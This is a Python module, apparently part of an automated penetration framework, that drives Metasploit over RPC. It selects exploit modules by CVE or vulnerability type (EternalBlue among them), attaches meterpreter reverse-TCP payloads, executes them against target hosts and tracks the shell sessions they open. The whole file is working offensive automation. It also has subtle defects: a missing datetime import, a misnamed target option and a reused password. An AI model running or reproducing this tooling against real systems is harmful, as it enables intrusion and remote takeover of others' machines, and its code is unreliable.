import time
from typing import Dict, Optional, List
from pymetasploit3.msfrpc import MsfRpcClient
from ..core.base_exploiter import BaseExploiter, ExploitException
from ..models.vulnerability import Vulnerability
from ..utils.network import resolve_host

class MetasploitExploiter(BaseExploiter):
    """使用Metasploit框架进行漏洞利用"""
    
    def _initialize_exploiter(self):
        """初始化Metasploit RPC客户端"""
        try:
            self.client = MsfRpcClient(
                self.config.get('password', 'yourpassword'),
                server=self.config.get('host', '127.0.0.1'),
                port=self.config.get('port', 55553),
                ssl=self.config.get('ssl', True)
            )
            self.running_exploits = {}
            self.logger.info("Metasploit exploiter initialized successfully")
        except Exception as e:
            self.logger.error(f"Failed to initialize Metasploit exploiter: {e}")
            raise ExploitException(str(e))
    
    def exploit(self, vulnerability: Vulnerability, target_info: Dict) -> Dict:
        """执行漏洞利用"""
        exploit_id = f"EXP_{int(time.time())}"
        self.logger.info(f"Starting exploit {exploit_id} for {vulnerability.vuln_id}")
        
        try:
            # 解析目标地址
            target_host = resolve_host(target_info['host'])
            if not target_host:
                raise ExploitException("Failed to resolve target host")
            
            # 选择合适的exploit模块
            module = self._select_exploit_module(vulnerability)
            if not module:
                raise ExploitException("No suitable exploit module found")
            
            # 配置exploit模块
            exploit = self.client.modules.use('exploit', module)
            exploit.target = target_host
            exploit.rport = target_info.get('port', 0)
            
            # 选择payload
            payload = self._select_payload(module, target_info)
            if payload:
                exploit.payload = payload
            
            # 设置其他选项
            for option, value in self._get_exploit_options(vulnerability).items():
                setattr(exploit, option, value)
            
            # 执行exploit
            self.logger.info(f"Running exploit module {module}")
            result = exploit.execute()
            
            # 处理结果
            exploit_result = self._process_exploit_result(result)
            self.running_exploits[exploit_id] = {
                'exploit': exploit,
                'start_time': datetime.now(),
                'status': exploit_result['status']
            }
            
            return {
                'exploit_id': exploit_id,
                'status': 'completed',
                'result': exploit_result
            }
            
        except Exception as e:
            self.logger.error(f"Exploit failed: {str(e)}")
            return {
                'exploit_id': exploit_id,
                'status': 'failed',
                'error': str(e)
            }
    
    def _select_exploit_module(self, vulnerability: Vulnerability) -> Optional[str]:
        """选择合适的exploit模块"""
        # 首先根据CVE ID查找
        if vulnerability.cve_id:
            modules = self.client.modules.search(vulnerability.cve_id)
            for module in modules:
                if module['type'] == 'exploit':
                    return module['fullname']
        
        # 根据漏洞类型选择通用模块
        exploit_modules = {
            'sql_injection': 'exploit/multi/http/php_sql_injection',
            'rce': 'exploit/multi/http/php_cgi_arg_injection',
            'buffer_overflow': 'exploit/windows/smb/ms17_010_eternalblue'
        }
        
        for vuln_type, module in exploit_modules.items():
            if vuln_type in vulnerability.name.lower():
                return module
        
        return None
    
    def _select_payload(self, module: str, target_info: Dict) -> Optional[str]:
        """选择合适的payload"""
        os_type = target_info.get('os_type', 'windows').lower()
        arch = target_info.get('arch', 'x86').lower()
        
        payload_map = {
            'windows': {
                'x86': 'windows/meterpreter/reverse_tcp',
                'x64': 'windows/x64/meterpreter/reverse_tcp'
            },
            'linux': {
                'x86': 'linux/x86/meterpreter/reverse_tcp',
                'x64': 'linux/x64/meterpreter/reverse_tcp'
            }
        }
        
        return payload_map.get(os_type, {}).get(arch)
    
    def _get_exploit_options(self, vulnerability: Vulnerability) -> Dict:
        """获取exploit选项配置"""
        return {
            'LHOST': self.config.get('lhost', '0.0.0.0'),
            'LPORT': self.config.get('lport', 4444),
            'HttpUsername': self.config.get('username'),
            'HttpPassword': self.config.get('password'),
            'SSL': self.config.get('use_ssl', False)
        }
    
    def _process_exploit_result(self, result: Dict) -> Dict:
        """处理exploit结果"""
        success = result.get('job_id') is not None
        
        return {
            'status': 'success' if success else 'failed',
            'session_created': success,
            'job_id': result.get('job_id'),
            'details': {
                'exploit_time': datetime.now().isoformat(),
                'result_data': result
            }
        }
    
    def get_exploit_status(self, exploit_id: str) -> Dict:
        """获取exploit任务状态"""
        if exploit_id not in self.running_exploits:
            return {'status': 'not_found'}
        
        exploit_info = self.running_exploits[exploit_id]
        sessions = self.client.sessions.list
        
        return {
            'status': exploit_info['status'],
            'start_time': exploit_info['start_time'].isoformat(),
            'active_sessions': len(sessions),
            'last_update': datetime.now().isoformat()
        }
    
    def stop_exploit(self, exploit_id: str) -> bool:
        """停止exploit任务"""
        if exploit_id not in self.running_exploits:
            return False
        
        try:
            exploit_info = self.running_exploits[exploit_id]
            if 'job_id' in exploit_info:
                self.client.jobs.stop(exploit_info['job_id'])
            del self.running_exploits[exploit_id]
            return True
        except:
            return False 